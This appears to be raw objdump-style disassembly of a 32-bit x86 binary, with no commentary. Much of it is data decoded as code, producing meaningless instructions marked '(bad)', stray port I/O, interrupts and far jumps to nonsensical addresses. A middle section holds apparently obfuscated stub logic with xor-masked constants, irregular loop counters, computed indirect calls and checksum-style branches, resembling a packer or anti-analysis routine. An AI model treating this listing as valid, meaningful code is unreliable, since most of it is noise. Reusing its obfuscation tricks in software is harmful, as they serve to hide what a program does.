  40ccaf:	and    DWORD PTR [ebp-0x4f],edi
  40ccb2:	ret    
  40ccb3:	jne    0x40cc57
  40ccb5:	daa    
  40ccb6:	std    
  40ccb7:	cld    
  40ccb8:	pop    edi
  40ccb9:	inc    edi
  40ccba:	mov    al,ds:0x5f30e269
  40ccbf:	mov    edx,0xc1c3a77c
  40ccc4:	mov    dh,cl
  40ccc6:	jp     0x40cd0e
  40ccc8:	fst    QWORD PTR [ebp+0x60aac36b]
  40ccce:	pop    esi
  40cccf:	and    BYTE PTR [ebp+0x8],ah
  40ccd2:	enter  0x15b3,0x33
  40ccd6:	sbb    eax,0xf4e06444
  40ccdb:	into   
  40ccdc:	ror    BYTE PTR [esi+edi*4+0xb],0x8e
  40cce1:	fild   QWORD PTR [eax+eax*1-0x5937dff1]
  40cce8:	push   0xcc648978
  40cced:	je     0x40cd59
  40ccef:	aaa    
  40ccf0:	in     al,0x27
  40ccf2:	jbe    0x40ccfb
  40ccf4:	das    
  40ccf5:	(bad)  
  40ccf6:	sbb    al,0xba
  40ccf8:	sub    esp,esp
  40ccfa:	popa   
  40ccfb:	fxch   st(4)
  40ccfd:	jecxz  0x40cd53
  40ccff:	push   edi
  40cd00:	push   esi
  40cd01:	int    0xb0
  40cd03:	inc    ecx
  40cd04:	add    ah,BYTE PTR [esi-0x15a80b1b]
  40cd0a:	shr    ecx,cl
  40cd0c:	jno    0x40cd63
  40cd0e:	loope  0x40ccb3
  40cd10:	inc    esp
  40cd11:	outs   dx,DWORD PTR ds:[esi]
  40cd12:	adc    esp,DWORD PTR [esp+edi*8-0x4d]
  40cd16:	jecxz  0x40cccd
  40cd18:	enter  0x774d,0xe8
  40cd1c:	arpl   WORD PTR ds:0x921e7c46,bx
  40cd22:	cmp    BYTE PTR [ebx],bl
  40cd24:	test   eax,0xae262f0d
  40cd29:	mov    cl,0x97
  40cd2b:	push   edx
  40cd2c:	int3   
  40cd2d:	or     eax,0x53b98265
  40cd32:	dec    eax
  40cd33:	xor    DWORD PTR [ebp-0x68e836fa],edx
  40cd39:	loop   0x40ccea
  40cd3b:	cmp    eax,0x1cc5118d
  40cd40:	push   ebx
  40cd41:	adc    DWORD PTR ds:0x70cb4458,edi
  40cd47:	test   bl,bh
  40cd49:	add    edi,ebx
  40cd4b:	jno    0x40cd6c
  40cd4d:	or     al,0x2e
  40cd4f:	push   ss
  40cd50:	imul   esp,DWORD PTR [eax+ecx*1+0x30],0x6a8d8843
  40cd58:	jno    0x40cda4
  40cd5a:	pop    ss
  40cd5b:	adc    al,0x81
  40cd5d:	(bad)  
  40cd5e:	mov    edx,0xb926fa8b
  40cd63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd64:	xchg   ebx,eax
  40cd65:	or     ah,dh
  40cd67:	cli    
  40cd68:	fstp   TBYTE PTR [edi+0x5556cbb5]
  40cd6e:	pushf  
  40cd6f:	push   ds
  40cd70:	jmp    0x40cddd
  40cd72:	cmc    
  40cd73:	stc    
  40cd74:	rcl    BYTE PTR [ebx],1
  40cd76:	xlat   BYTE PTR ds:[ebx]
  40cd77:	aaa    
  40cd78:	mov    eax,0xb113da81
  40cd7d:	mov    esp,0x355fe4ce
  40cd82:	pop    edx
  40cd83:	mov    ebp,0x32dba056
  40cd88:	rcl    DWORD PTR [ecx+0x26894ecd],0x19
  40cd8f:	inc    edi
  40cd90:	fwait
  40cd91:	rcl    ch,0x15
  40cd94:	nop
  40cd95:	push   cs
  40cd96:	test   DWORD PTR [ebx+esi*4+0x275c5c09],esi
  40cd9d:	xchg   edx,eax
  40cd9e:	push   ebp
  40cd9f:	sub    DWORD PTR [edx+esi*2-0x20],ecx
  40cda3:	xchg   ecx,eax
  40cda4:	lock fmul st,st(0)
  40cda7:	mov    al,BYTE PTR [eax+ebx*4+0x2778882e]
  40cdae:	dec    eax
  40cdaf:	lods   al,BYTE PTR ds:[esi]
  40cdb0:	fmul   st(6),st
  40cdb2:	xor    BYTE PTR [edi],dh
  40cdb4:	into   
  40cdb5:	xor    DWORD PTR [ecx+ecx*2-0xa94bf2a],ecx
  40cdbc:	(bad)  
  40cdbd:	fild   WORD PTR [eax]
  40cdbf:	sbb    BYTE PTR [ebx],ah
  40cdc1:	out    0xa4,al
  40cdc3:	xchg   ebx,eax
  40cdc4:	sbb    al,0x5f
  40cdc6:	mov    bh,0x26
  40cdc8:	ret    0x273
  40cdcb:	dec    edi
  40cdcc:	jp     0x40cdab
  40cdce:	in     eax,0xf3
  40cdd0:	pop    ebx
  40cdd1:	jnp    0x40cd55
  40cdd3:	retf   0x2126
  40cdd6:	dec    ecx
  40cdd7:	fbstp  TBYTE PTR ds:0x7992c698
  40cddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdde:	in     eax,dx
  40cddf:	and    ecx,ecx
  40cde1:	sub    DWORD PTR [ebx-0x76],edx
  40cde4:	dec    esp
  40cde5:	cwde   
  40cde6:	aas    
  40cde7:	jne    0x40cdab
  40cde9:	idiv   DWORD PTR [eax+0x71ce34cb]
  40cdef:	pop    ebx
  40cdf0:	sti    
  40cdf1:	addr16 iret 
  40cdf3:	sub    ah,BYTE PTR ds:0xa7291bca
  40cdf9:	add    dh,BYTE PTR [edi]
  40cdfb:	and    al,0x1a
  40cdfd:	pop    ds
  40cdfe:	push   ebx
  40cdff:	or     edx,ebx
  40ce01:	data16 aad 0xf3
  40ce04:	xchg   esi,edi
  40ce06:	int3   
  40ce07:	pop    ds
  40ce08:	sbb    BYTE PTR [esi],0x8e
  40ce0b:	push   ss
  40ce0c:	push   edx
  40ce0d:	mov    bh,0x9a
  40ce0f:	push   edx
  40ce10:	jmp    0xc2146ad7
  40ce15:	pushf  
  40ce16:	pop    ebp
  40ce17:	or     ebp,0x5c
  40ce1a:	sbb    al,0x89
  40ce1c:	rol    WORD PTR ds:0xe1d72180,0x29
  40ce24:	stos   BYTE PTR es:[edi],al
  40ce25:	xor    eax,0xbee74c2b
  40ce2a:	sahf   
  40ce2b:	ins    BYTE PTR es:[edi],dx
  40ce2c:	(bad)  
  40ce2d:	fistp  QWORD PTR [esi-0x28]
  40ce30:	add    DWORD PTR [ebp+0x3478ac3c],edi
  40ce36:	loop   0x40ce41
  40ce38:	pop    ds
  40ce39:	xchg   bh,bh
  40ce3b:	inc    esp
  40ce3c:	jg     0x40cddb
  40ce3e:	in     eax,dx
  40ce3f:	cdq    
  40ce40:	ret    0x2511
  40ce43:	cmc    
  40ce44:	jl     0x40ce9f
  40ce46:	out    0x3b,eax
  40ce48:	enter  0x840f,0x71
  40ce4c:	add    BYTE PTR [eax],al
  40ce4e:	add    BYTE PTR [ebx+0x458bec7d],cl
  40ce54:	or     BYTE PTR [ebx+0x448b1455],cl
  40ce5a:	add    BYTE PTR [ecx+edi*4],0x93
  40ce5e:	or     BYTE PTR [ecx+0x7],dl
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c66
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x42386a
  40cf91:	push   0x423822
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a86
  40cff7:	mov    ebx,DWORD PTR ds:0x421aae
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c66
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421cea
  40d0ed:	mov    esi,DWORD PTR ds:0x421ce2
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421ce2,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	push   edx
  40d112:	nop
  40d113:	add    BYTE PTR [edx+eax*8-0x2f],al
  40d117:	bound  esp,QWORD PTR [edx-0x15]
  40d11a:	pop    edi
  40d11b:	bound  esp,QWORD PTR [edx+0x58]
  40d11e:	ins    DWORD PTR es:[edi],dx
  40d11f:	push   0xffffffcd
  40d121:	jmp    0x6c6a:0x4c5ff2cc
  40d128:	je     0x40d186
  40d12a:	mul    DWORD PTR [edx+0x58ecfdb7]
  40d130:	or     eax,DWORD PTR [ecx]
  40d132:	mov    ds:0x434c8a8a,al
  40d137:	mov    dl,0x84
  40d139:	sub    al,0xc3
  40d13b:	jmp    0x40d1b9
  40d13d:	xor    dl,BYTE PTR [esi-0x2f]
  40d140:	xor    edi,0x29
  40d143:	arpl   WORD PTR [eax-0x1f],bx
  40d146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d147:	out    0xc9,al
  40d149:	sub    ebp,DWORD PTR [ebx+0x9a05611]
  40d14f:	scas   eax,DWORD PTR es:[edi]
  40d150:	lahf   
  40d151:	inc    esi
  40d152:	sub    ch,bl
  40d154:	xor    dh,BYTE PTR [edi-0x16]
  40d157:	ds xchg edx,eax
  40d159:	jno    0x40d1cc
  40d15b:	pop    ds
  40d15c:	inc    esp
  40d15d:	gs mov bl,0x68
  40d160:	pop    edx
  40d161:	loop   0x40d1ce
  40d163:	push   ss
  40d164:	xchg   esp,eax
  40d165:	cld    
  40d166:	jl     0x40d141
  40d168:	push   ds
  40d169:	jmp    0x40d11d
  40d16b:	pop    ds
  40d16c:	mov    ebx,0x532776c1
  40d171:	mov    ds:0x26cacba2,al
  40d176:	cmp    dl,BYTE PTR [eax+ecx*8]
  40d179:	fs sub al,0x8
  40d17c:	fisttp QWORD PTR [ecx+0x3a]
  40d17f:	jo     0x40d13b
  40d181:	and    al,0x6
  40d183:	xchg   BYTE PTR [edx],ah
  40d185:	int    0xee
  40d187:	mov    esp,0x41feb4c5
  40d18c:	and    al,0x1
  40d18e:	sbb    eax,0x248d557f
  40d193:	mov    esp,0x911e2bfb
  40d198:	dec    ebx
  40d199:	lahf   
  40d19a:	cmp    BYTE PTR [ebp+ebx*8+0x6dcf90a0],al
  40d1a1:	fwait
  40d1a2:	js     0x40d190
  40d1a4:	aad    0xda
  40d1a6:	jmp    0x40d21d
  40d1a8:	dec    ecx
  40d1a9:	call   DWORD PTR [edi]
  40d1ab:	cmp    al,0x65
  40d1ad:	inc    ecx
  40d1ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1af:	aad    0x8b
  40d1b1:	inc    eax
  40d1b2:	cmp    al,0x78
  40d1b4:	adc    ecx,DWORD PTR [ecx]
  40d1b6:	mov    cl,0x28
  40d1b8:	pop    ds
  40d1b9:	lods   eax,DWORD PTR ds:[esi]
  40d1ba:	dec    ebx
  40d1bb:	cmp    BYTE PTR [ebx+0x2418eade],0x1c
  40d1c2:	push   ss
  40d1c3:	(bad)  
  40d1c4:	leave  
  40d1c5:	pop    ds
  40d1c6:	xchg   ebx,eax
  40d1c7:	lock cld 
  40d1c9:	retf   0x3328
  40d1cc:	or     al,0x3a
  40d1ce:	(bad)  
  40d1cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1d0:	cli    
  40d1d1:	sub    edi,eax
  40d1d3:	cmp    dl,bh
  40d1d5:	adc    esi,ecx
  40d1d7:	mov    ch,0x46
  40d1d9:	stc    
  40d1da:	ror    DWORD PTR [edi-0x43],1
  40d1dd:	in     al,dx
  40d1de:	das    
  40d1df:	clc    
  40d1e0:	jb     0x40d199
  40d1e2:	gs mov bh,0xbf
  40d1e5:	popa   
  40d1e6:	add    eax,0xb8365ba9
  40d1eb:	push   esi
  40d1ec:	popa   
  40d1ed:	cdq    
  40d1ee:	out    0xb4,ax
  40d1f1:	add    BYTE PTR [esi+edi*4],ah
  40d1f4:	inc    esi
  40d1f5:	call   0xf3ff:0x75dd4380
  40d1fc:	inc    ebx
  40d1fd:	loop   0x40d203
  40d1ff:	sti    
  40d200:	outs   dx,BYTE PTR ds:[esi]
  40d201:	enter  0xbcbb,0xc
  40d205:	adc    al,0xf
  40d207:	jg     0x40d1cd
  40d209:	mov    eax,ds:0x1b090473
  40d20e:	ins    DWORD PTR es:[edi],dx
  40d20f:	inc    esp
  40d210:	(bad)  
  40d211:	and    al,0xd2
  40d213:	jl     0x40d260
  40d215:	imul   ebp,DWORD PTR [edi+0x58],0xffffffc5
  40d219:	add    ebx,DWORD PTR [esi-0x2f85b166]
  40d21f:	sub    cl,BYTE PTR [ebx+0x38]
  40d222:	and    esp,eax
  40d224:	adc    BYTE PTR [ecx+0x6c],bh
  40d227:	repnz add BYTE PTR [ebx-0x64],dl
  40d22b:	jp     0x40d1d7
  40d22d:	stos   BYTE PTR es:[edi],al
  40d22e:	inc    eax
  40d22f:	and    ch,al
  40d231:	int3   
  40d232:	jecxz  0x40d284
  40d234:	add    edx,DWORD PTR [edi-0x9]
  40d237:	fistp  DWORD PTR [ebp+0x7e3f1f0f]
  40d23d:	pop    esp
  40d23e:	ins    BYTE PTR es:[edi],dx
  40d23f:	ds scas al,BYTE PTR es:[edi]
  40d241:	adc    BYTE PTR es:[ebx+0x73],ch
  40d245:	xchg   ecx,eax
  40d246:	sbb    al,0xb7
  40d248:	pop    esp
  40d249:	inc    edi
  40d24a:	and    bl,bh
  40d24c:	lods   al,BYTE PTR ds:[esi]
  40d24d:	cli    
  40d24e:	xor    al,0xff
  40d250:	icebp  
  40d251:	js     0x40d1ec
  40d253:	bnd jns 0x40d26f
  40d256:	xor    DWORD PTR [edx-0x5e988ace],0xffffffe6
  40d25d:	inc    ebp
  40d25e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d25f:	dec    esp
  40d260:	cmp    BYTE PTR [esi],bh
  40d262:	add    eax,0xf63e47cb
  40d267:	jns    0x40d2b2
  40d269:	xchg   ebp,eax
  40d26a:	mov    bl,0x90
  40d26c:	mov    eax,ds:0x77f01808
  40d271:	mov    ds:0x5c5e8682,al
  40d276:	xor    bl,al
  40d278:	mov    al,ds:0xf6d38d71
  40d27d:	out    dx,al
  40d27e:	jge    0x40d2cc
  40d280:	in     eax,dx
  40d281:	xor    BYTE PTR [ebx+0x4cb037dc],0x40
  40d288:	fidiv  DWORD PTR [ebx+0x29]
  40d28b:	popf   
  40d28c:	push   ds
  40d28d:	gs mov ecx,0xd0cf7fdb
  40d293:	mov    ecx,0x17d37bb7
  40d298:	jns    0x40d26c
  40d29a:	out    0x52,eax
  40d29c:	addr16 ss (bad) 
  40d29f:	inc    ecx
  40d2a0:	inc    edx
  40d2a1:	pop    esi
  40d2a2:	xchg   ebx,eax
  40d2a3:	movaps xmm0,XMMWORD PTR ds:0xe26f3878
  40d2aa:	push   0x29c72d4e
  40d2af:	or     BYTE PTR [edx-0x27336201],dh
  40d2b5:	fimul  DWORD PTR [edx]
  40d2b7:	mov    esi,0x2d20388e
  40d2bc:	xchg   edx,eax
  40d2bd:	cli    
  40d2be:	sbb    eax,0x578cc627
  40d2c3:	inc    edi
  40d2c4:	js     0x40d296
  40d2c6:	shl    BYTE PTR [edx+0x2bbf2088],0x8
  40d2cd:	repnz adc DWORD PTR [ebp+edi*8+0x7df7282a],edi
  40d2d5:	int    0x58
  40d2d7:	xor    edi,DWORD PTR [esi]
  40d2d9:	sbb    DWORD PTR ds:0xc14f085a,eax
  40d2df:	pop    es
  40d2e0:	xchg   BYTE PTR [ebp-0x35],ch
  40d2e3:	iret   
  40d2e4:	sbb    DWORD PTR ds:[edi+0x15],edi
  40d2e8:	fiadd  DWORD PTR [edx-0x2b31953a]
  40d2ee:	jb     0x40d2cb
  40d2f0:	std    
  40d2f1:	jbe    0x40d2a1
  40d2f3:	push   ebx
  40d2f4:	mov    al,0xc2
  40d2f6:	shl    BYTE PTR [eax],1
  40d2f8:	repnz xor eax,0x2b66d6ec
  40d2fe:	xchg   edx,eax
  40d2ff:	dec    ebx
  40d300:	push   0x2af0d35f
  40d305:	es sti 
  40d307:	dec    esp
  40d308:	stos   DWORD PTR es:[edi],eax
  40d309:	pop    ebx
  40d30a:	push   ds
  40d30b:	repz add DWORD PTR [edx+edi*4],ebp
  40d30f:	fistp  DWORD PTR [ebp-0x2de3c2cf]
  40d315:	(bad)  
  40d316:	jl     0x40d353
  40d318:	je     0x40d361
  40d31a:	mov    ch,0xd8
  40d31c:	push   ds
  40d31d:	or     al,0x6e
  40d31f:	ficomp DWORD PTR [ebp+0x39d9988e]
  40d325:	sbb    eax,0xf6c23c34
  40d32a:	lea    eax,[esi-0x63]
  40d32d:	fcom   DWORD PTR [edx+edi*8-0x1e]
  40d331:	ins    DWORD PTR es:[edi],dx
  40d332:	ds mov ebp,0xefdde784
  40d338:	push   edi
  40d339:	cmp    al,0x70
  40d33b:	into   
  40d33c:	ror    esp,1
  40d33e:	and    esp,DWORD PTR [ebp-0x27382106]
  40d344:	xor    esp,esp
  40d346:	cld    
  40d347:	jg     0x40d335
  40d349:	jb     0x40d31c
  40d34b:	xchg   ecx,eax
  40d34c:	xlat   BYTE PTR ds:[ebx]
  40d34d:	inc    esi
  40d34e:	add    esi,ebp
  40d350:	mov    ds:0xc8eaa916,al
  40d355:	xchg   BYTE PTR [ecx],dh
  40d357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d359:	pushf  
  40d35a:	jmp    0xe5dc:0x536c45ec
  40d361:	in     al,0xc8
  40d363:	(bad)  
  40d364:	sbb    DWORD PTR [eax],edi
  40d366:	mov    al,BYTE PTR [esi]
  40d368:	jnp    0x40d317
  40d36a:	add    BYTE PTR [esi],0x31
  40d36d:	in     eax,0x1c
  40d36f:	cmp    DWORD PTR [ecx+0x6ad481e6],esp
  40d375:	adc    eax,0x5a5e5d75
  40d37a:	dec    esi
  40d37b:	pop    ebp
  40d37c:	push   0x5c927125
  40d381:	(bad)
  40d385:	adc    bh,dh
  40d387:	xor    al,0x13
  40d389:	icebp  
  40d38a:	and    eax,0xfbba565d
  40d38f:	ret    0x57e3
  40d392:	pusha  
  40d393:	inc    eax
  40d394:	cmp    ebp,0xfffffff9
  40d397:	rcl    DWORD PTR [esi+0x32],0x49
  40d39b:	mov    edx,es
  40d39d:	mov    eax,ds:0x9208f1b1
  40d3a2:	mov    bl,BYTE PTR [ebp+ebx*4+0x2f]
  40d3a6:	pop    ebp
  40d3a7:	mov    dl,0xb2
  40d3a9:	cmp    eax,edx
  40d3ab:	adc    DWORD PTR [edx+0x4a],ebp
  40d3ae:	sbb    edi,ecx
  40d3b0:	pmulhuw mm3,QWORD PTR [ebp+0x1da27b8f]
  40d3b7:	inc    ecx
  40d3b8:	dec    esp
  40d3b9:	test   DWORD PTR [eax+0x64],ecx
  40d3bc:	sub    al,0x29
  40d3be:	imul   ebp,DWORD PTR [edx+esi*1],0x66
  40d3c2:	outs   dx,BYTE PTR ds:[esi]
  40d3c3:	fdiv   st(5),st
  40d3c5:	imul   ebp,DWORD PTR ds:0xd59aaf4d,0x6ea6a584
  40d3cf:	mov    DWORD PTR [ecx-0x7e],edi
  40d3d2:	int    0xb4
  40d3d4:	sti    
  40d3d5:	in     eax,dx
  40d3d6:	push   ds
  40d3d7:	bound  esi,QWORD PTR [edx-0x29e52f89]
  40d3dd:	daa    
  40d3de:	fwait
  40d3df:	and    eax,esp
  40d3e1:	mov    dl,0x78
  40d3e3:	mov    al,0x8c
  40d3e5:	(bad)  
  40d3e6:	sub    al,0x73
  40d3e8:	loope  0x40d421
  40d3ea:	mov    esp,DWORD PTR [esi+0x7]
  40d3ed:	(bad)  
  40d3ee:	das    
  40d3ef:	pusha  
  40d3f0:	mov    bl,0x37
  40d3f2:	mov    ebx,0x4b4995f1
  40d3f7:	xlat   BYTE PTR ds:[ebx]
  40d3f8:	mov    ebp,0x3283941a
  40d3fd:	push   cs
  40d3fe:	ret    
  40d3ff:	mov    esp,0xa725949e
  40d404:	jbe    0x40d40c
  40d406:	cli    
  40d407:	jne    0x40d38e
  40d409:	jp     0x40d413
  40d40b:	push   ecx
  40d40c:	inc    edx
  40d40d:	push   ebp
  40d40e:	les    ecx,FWORD PTR [edi]
  40d410:	or     BYTE PTR [ecx+0x77c685ae],cl
  40d416:	retf   0x58d8
  40d419:	mov    bl,0xdb
  40d41b:	repz jp 0x40d486
  40d41e:	retf   0xdadb
  40d421:	inc    edi
  40d422:	in     eax,dx
  40d423:	repnz adc BYTE PTR ss:[ecx+ebx*1-0x67],bh
  40d429:	xchg   edi,eax
  40d42a:	aaa    
  40d42b:	xlat   BYTE PTR ds:[ebx]
  40d42c:	fistp  DWORD PTR [ebp+0x53]
  40d42f:	(bad)  
  40d433:	sbb    al,0x26
  40d435:	sub    al,0x3b
  40d437:	adc    BYTE PTR [edx],bh
  40d439:	xor    BYTE PTR [ecx],ch
  40d43b:	or     DWORD PTR [ebx],ecx
  40d43d:	push   ebp
  40d43e:	std    
  40d43f:	dec    ecx
  40d440:	(bad)  
  40d441:	mov    ss,ebp
  40d443:	daa    
  40d444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d445:	cmp    DWORD PTR [edi-0x2a],ebx
  40d448:	xchg   edx,eax
  40d449:	bound  edx,QWORD PTR [esp+edi*4-0x48be51e7]
  40d450:	sar    al,1
  40d452:	test   eax,0x723363c6
  40d457:	inc    esi
  40d458:	(bad)  
  40d459:	dec    esi
  40d45a:	mov    cl,0x6e
  40d45c:	je     0x40d4be
  40d45e:	(bad)  
  40d45f:	sahf   
  40d460:	aaa    
  40d461:	pop    ebx
  40d462:	mov    DWORD PTR [ebp+0xd],esi
  40d465:	and    DWORD PTR [ecx+esi*4-0x2],esi
  40d469:	popa   
  40d46a:	div    DWORD PTR [esi]
  40d46c:	fsubr  QWORD PTR [esi-0x506cb149]
  40d472:	xor    eax,0xd485420
  40d477:	cmp    al,0x20
  40d479:	aas    
  40d47a:	ins    BYTE PTR es:[edi],dx
  40d47b:	xchg   edx,eax
  40d47c:	mov    DWORD PTR [ecx],ebx
  40d47e:	xor    dl,BYTE PTR ss:[ecx+0x15aa47f1]
  40d485:	push   0x960e96b0
  40d48a:	xchg   ecx,eax
  40d48b:	cli    
  40d48c:	aas    
  40d48d:	div    DWORD PTR [ecx-0x2aecc703]
  40d493:	inc    eax
  40d494:	and    ebp,edx
  40d496:	and    eax,0x9b75ed10
  40d49b:	dec    ebx
  40d49c:	adc    edx,edx
  40d49e:	adc    al,0xf8
  40d4a0:	imul   dl
  40d4a2:	mov    dh,0xc2
  40d4a4:	and    BYTE PTR ds:0xee28e0dd,cl
